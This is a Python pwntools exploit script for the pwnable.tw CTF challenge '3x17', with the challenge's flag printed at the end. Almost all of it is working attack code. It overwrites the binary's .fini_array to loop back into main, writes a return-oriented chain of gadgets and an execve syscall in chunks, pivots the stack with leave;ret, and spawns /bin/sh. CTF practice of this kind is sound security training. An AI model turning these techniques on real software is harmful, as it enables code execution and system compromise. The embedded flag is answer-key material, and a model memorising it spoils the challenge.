#!/usr/bin/python3 
from pwn import *
exe = ELF("./3x17")
context.binary = exe

r = process([exe.path])
# r = connect('chall.pwnable.tw', 10105)
input()

libc_csu_fini = 0x402960
fini_array = 0x04b40f0
main = 0x0401b6d
payload = flat(libc_csu_fini, main)
# Overwrite the foo_destructor of .fini_array to main so it will return to main 
r.sendlineafter(b'addr:', f'{fini_array}'.encode())
r.sendlineafter(b'data:', payload)
pause()
# Finding some gadget
pop_rax = 0x000000000041e4af
pop_rdi = 0x0000000000401696
pop_rdx = 0x0000000000446e35
pop_rsi = 0x0000000000406c30
syscall = 0x00000000004022b4
rw_section = 0x00000000004b4000
read_addr = 0x446e20
# This is for overwrite to do pivot stack
payload = flat(
	pop_rdi, 0, 
	pop_rsi, rw_section,
	pop_rdx, 8,
	read_addr,
	pop_rax, 0x3b,
	pop_rdi, rw_section, 
	pop_rdx, 0,
	pop_rsi, 0, 
	syscall
	)
for i in range(0, len(payload), 0x18):
	r.sendafter(b'addr:', f'{fini_array + 0x10 + i}'.encode())
	r.sendafter(b'data:', payload[i:i+0x18])
leave_ret = 0x0000000000401c4b
ret = leave_ret + 1
r.sendafter(b'addr:', f'{fini_array}'.encode())
r.sendafter(b'data:', flat(leave_ret, ret))
input("Continue...")
r.send(b'/bin/sh\0')
r.interactive()
# FLAG{Its_just_a_b4by_c4ll_0riented_Pr0gramm1ng_in_3xit}